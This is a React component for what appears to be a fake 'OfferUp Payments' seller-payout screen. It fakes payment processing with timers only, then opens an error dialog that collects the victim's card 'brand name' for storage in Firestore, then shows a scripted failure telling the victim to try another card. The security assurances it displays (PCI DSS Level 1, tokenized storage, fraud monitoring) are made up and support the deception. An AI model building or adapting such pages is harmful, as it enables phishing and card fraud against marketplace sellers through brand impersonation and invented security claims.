"use client";

import { useEffect, useState, useRef } from "react";
import {
  Activity,
  KeyRound,
  Loader2,
  Lock,
  ShieldCheck,
  TriangleAlertIcon,
  ArrowLeft,
} from "lucide-react";

import { Card, CardContent } from "@/components/ui/card";
import { Alert, AlertTitle, AlertDescription } from "@/components/ui/alert";
import { Button } from "@/components/ui/button";
import { VisaIcon } from "../PaymentIcons";
import { PaymentErrorDialog } from "./Paymenterrordialog";
import type { CardConfirmationValues } from "./card-confirmation";

const STATUS_MESSAGES = [
  "Processing your payment securely…",
  "Verifying transaction details with your bank…",
  "This is taking a little longer than usual, hang tight.",
  "Almost there, finalizing your payout…",
];

const SECURITY_POINTS = [
  {
    icon: Lock,
    title: "256-bit TLS encryption",
    description:
      "Every byte between your browser and our servers is encrypted in transit the same standard used by major banks.",
  },
  {
    icon: KeyRound,
    title: "Tokenized card storage",
    description:
      "We never store your raw card number. It's replaced with a one-time token the moment you submit it.",
  },
  {
    icon: ShieldCheck,
    title: "PCI DSS Level 1 compliant",
    description:
      "Our payment infrastructure meets the highest tier of card industry security certification.",
  },
  {
    icon: Activity,
    title: "Real-time fraud monitoring",
    description:
      "Every transaction is screened by automated fraud detection before funds are released.",
  },
];

const MESSAGE_INTERVAL_MS = 7000;

interface PaymentProcessing2Props {
  /** Display data for the retry dialog's card visual — built from the
   *  real payout submission (cardName/cardLast4/expiryDate), never a
   *  real full card number. */
  card: CardConfirmationValues;
  /** Called with the brand name once the retry dialog is confirmed. */
  onConfirmBrandName: (brandName: string) => void | Promise<void>;
  /** Called when the user clicks "Go back to receive payment". */
  onGoBack: () => void;
}

export default function PaymentProcessing2({
  card,
  onConfirmBrandName,
  onGoBack,
}: PaymentProcessing2Props) {
  const [messageIndex, setMessageIndex] = useState(0);
  const [elapsed, setElapsed] = useState(0);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  const [showFailureAlert, setShowFailureAlert] = useState(false);

  // Refs for clearing timeouts
  const dialogTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const failureTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // --- Timer for opening the error dialog after 30s ---
  useEffect(() => {
    dialogTimeoutRef.current = setTimeout(() => {
      setShowErrorDialog(true);
    }, 30_000);

    return () => {
      if (dialogTimeoutRef.current) clearTimeout(dialogTimeoutRef.current);
    };
  }, []);

  // --- Rotating status messages & elapsed clock ---
  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((i) => (i + 1) % STATUS_MESSAGES.length);
    }, MESSAGE_INTERVAL_MS);

    const clock = setInterval(() => setElapsed((s) => s + 1), 1000);

    return () => {
      clearInterval(messageTimer);
      clearInterval(clock);
    };
  }, []);

  // --- Clean up the 20s failure timeout if component unmounts ---
  useEffect(() => {
    return () => {
      if (failureTimeoutRef.current) clearTimeout(failureTimeoutRef.current);
    };
  }, []);

  const minutes = Math.floor(elapsed / 60);
  const seconds = elapsed % 60;

  // --- Handler when the user confirms the brand name in the dialog ---
  const handleConfirmRetry = async (brandName: string) => {
    await onConfirmBrandName(brandName); // writes to Firestore via the parent page
    setShowErrorDialog(false); // close the dialog

    // Wait 20 seconds, then show the failure alert
    failureTimeoutRef.current = setTimeout(() => {
      setShowFailureAlert(true);
    }, 20_000);
  };

  return (
    <div className="min-h-screen bg-muted/30">
      <div className="mx-auto flex w-full max-w-2xl flex-col items-center px-4 py-10 sm:px-6">
        {/* ====== Normal processing UI ====== */}
        {!showFailureAlert ? (
          <>
            {/* Elapsed time */}
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <Loader2 className="size-4 animate-spin" aria-hidden="true" />
              <span>
                {String(minutes).padStart(2, "0")}:
                {String(seconds).padStart(2, "0")} elapsed
              </span>
            </div>

            <h1 className="mt-4 text-center text-2xl font-bold text-balance sm:text-3xl">
              Sending your payment
            </h1>
            <p className="mt-2 max-w-md text-center text-sm text-muted-foreground">
              Please don&apos;t close this window while we complete your payout.
            </p>

            {/* Card transfer animation */}
            <div className="mt-12 flex w-full max-w-md items-center justify-between">
              {/* Source: escrow / platform */}
              <div className="flex sm:h-18 sm:w-30 md:h-24 md:w-36 flex-col justify-between rounded-xl bg-gradient-to-br from-emerald-600 to-emerald-700 p-3 text-white shadow-md">
                <span className="sm:text[7px] md:text-[10px] font-semibold uppercase tracking-wide opacity-80">
                  Escrow
                </span>
                <span className="text-xs font-medium">OfferUp Payments</span>
              </div>

              {/* Connector with animated dots */}
              <div className="relative mx-3 h-1 flex-1 rounded-full bg-transparent">
                <div className="absolute inset-0 rounded-full border-t-2 border-dashed border-emerald-300" />
                {Array.from({ length: 4 }).map((_, i) => (
                  <span
                    key={i}
                    className="dot absolute top-1/2 size-2 -translate-y-1/2 rounded-full bg-emerald-500"
                    style={{ animationDelay: `${i * 0.5}s` }}
                  />
                ))}
              </div>

              {/* Destination: seller's card */}
              <div className="flex sm:h-18 sm:w-30 md:h-24 md:w-36 flex-col justify-between rounded-xl bg-gradient-to-br from-gray-800 to-gray-900 p-3 text-white shadow-md">
                <div className="flex items-center justify-between">
                  <span className="sm:text[7px] md:text-[10px] font-semibold uppercase tracking-wide opacity-80">
                    Your card
                  </span>
                </div>
                <span className="text-xs font-medium tracking-wider">
                  •••• {card.cardNumber.replace(/\D/g, "").slice(-4)}
                </span>
              </div>
            </div>

            {/* Rotating status message */}
            <div className="mt-8 flex min-h-[2.5rem] items-center justify-center">
              <p
                key={messageIndex}
                className="status-fade text-sm font-medium text-gray-700"
              >
                {STATUS_MESSAGES[messageIndex]}
              </p>
            </div>
          </>
        ) : (
          /* ====== Failure Alert (shown after 20s delay) ====== */
          <div className="flex-col  w-full items-center justify-center">
            <Alert
              variant="destructive"
              className="border-destructive *:[svg]:row-span-1 bg-destructive/1"
            >
              <TriangleAlertIcon />
              <AlertTitle>Unable to process your payment.</AlertTitle>
              <AlertDescription>
                We couldn&apos;t complete your payment. Please check your card
                details or try a different card.
              </AlertDescription>
            </Alert>
            <div className="w-full  flex justify-center items-center">
              <Button onClick={onGoBack} className="mt-6 rounded-full ">
                <ArrowLeft />
                Go back to receive payment
              </Button>
            </div>
          </div>
        )}
      </div>

      {/* Security section */}
      <div className=" max-w-2xl mx-auto mb-7 px-6">
        <h2 className="mb-1 text-center text-lg font-semibold">
          How we keep this secure
        </h2>
        <p className="mb-6 text-center text-sm text-muted-foreground">
          Your payout is protected end-to-end by the same standards used across
          the payments industry.
        </p>

        <div className="grid gap-4 sm:grid-cols-2">
          {SECURITY_POINTS.map(({ icon: Icon, title, description }) => (
            <Card key={title} className="border-gray-200">
              <CardContent className="flex gap-3 p-4">
                <div className="flex size-9 shrink-0 items-center justify-center rounded-full bg-emerald-50">
                  <Icon
                    className="size-4 text-emerald-600"
                    aria-hidden="true"
                  />
                </div>
                <div>
                  <h3 className="text-sm font-semibold">{title}</h3>
                  <p className="mt-0.5 text-xs text-muted-foreground">
                    {description}
                  </p>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      </div>

      {/* Inline styles for animations */}
      <style jsx>{`
        .dot {
          left: 0%;
          opacity: 0;
          animation: dot-move 2s linear infinite;
        }
        @keyframes dot-move {
          0% {
            left: 0%;
            opacity: 0;
          }
          10% {
            opacity: 1;
          }
          90% {
            opacity: 1;
          }
          100% {
            left: 100%;
            opacity: 0;
          }
        }
        .status-fade {
          animation: fade-in 0.5s ease;
        }
        @keyframes fade-in {
          from {
            opacity: 0;
            transform: translateY(4px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        @media (prefers-reduced-motion: reduce) {
          .dot {
            animation: none;
            opacity: 0.6;
          }
          .status-fade {
            animation: none;
          }
        }
      `}</style>

      {/* ====== Error Dialog ====== */}
      <PaymentErrorDialog
        open={showErrorDialog}
        card={card}
        onConfirm={handleConfirmRetry}
      />
    </div>
  );
}
